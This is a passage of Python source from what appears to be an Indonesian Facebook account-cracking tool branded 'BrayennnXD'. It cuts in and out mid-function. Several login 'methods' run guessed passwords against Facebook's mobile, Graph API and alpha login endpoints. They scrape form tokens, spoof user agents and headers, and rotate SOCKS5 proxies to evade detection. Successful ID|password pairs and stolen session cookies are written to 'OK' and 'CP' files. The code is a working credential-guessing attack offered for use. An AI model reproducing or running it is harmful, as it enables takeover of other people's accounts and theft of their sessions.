			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#--------------------[ METODE API ]-----------------#
def reguler2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(liu)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]B-Api[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			params = {
				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				"sdk_version": {random.randint(1,26)}, 
				"email": idf,
				"locale": "en_US",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers = {
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"user-agent": ua,
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
			}
			post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
			if "User must verify their account" in post.text:
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "session_key" in post.text and "EAA" in post.text:
				if 'no' in taplikasi:
					ok+=1
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					user = re.findall("c_user=(\d+)",coki)[0]
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {coki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					user = re.findall("c_user=(\d+)",coki)[0]
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {coki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE ASYNC ]--------------------#
def kontol(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]Async[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=206428089508143&kid_directed_site=0&app_id=206428089508143&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D206428089508143%26redirect_uri%3Dhttps%253A%252F%252Fwww.zalora.co.id%252Fcustomer%252Fsocialconnect%252Fendpoint%253Fhauth_done%253DFacebook%26scope%3Demail%252Cuser_birthday%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0c67b520-a187-48a6-8125-3256fe975775%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.zalora.co.id%2Fcustomer%2Fsocialconnect%2Fendpoint%3Fhauth_done%3DFacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DHA-S3X0PV7ZQH6DAFTK5IJRM9EWYCBOU8214NLG%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v8.0/dialog/oauth?response_type=code%2Cgranted_scopes&client_id=1239138353201716&redirect_uri=https%3A%2F%2Fkachishop-d0c3a.firebaseapp.com%2F__%2Fauth%2Fhandler&state=AMbdmDmDaplWH_DdoV_W4QQTmWmecz1GxWXAlj2cdr_Vf_0aKRi-oWe-Z3FTiIj8pa4JD342zNeLW91aHp12LY9dOYb8tOPKOtsEllaj3JYdF79-cf8Wr-OPLhAn7Zq1LeUfJWdCxX2mAPKVYOG0CChDNxiBnmVCUG3LGCJ3sCTSc1Eb5dZseFVZe2lUqc6Yzz92V58Ki3TvYM7HjC_421qwGmMHJNi0xIaeVA917YCkm8d-wMthO_lSm3eIQPryPnbreRYgONBzhtx692MYCYA3_6dPlkm70JVkIuHGHRiJ98KokSMQRhxjZJCAp_GbKVMDXvSWm0ZtdYR5CI4UZgrB&scope=public_profile%2Cemail&display=popup&ret=login&fbapp_pres=0&logger_id=087a364c-3d69-45b4-a55b-047dae50317c&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#-----------------------[ METODE ALPHA ]--------------------#
def bapi(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]M-Alpha[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.alpha.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.alpha.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
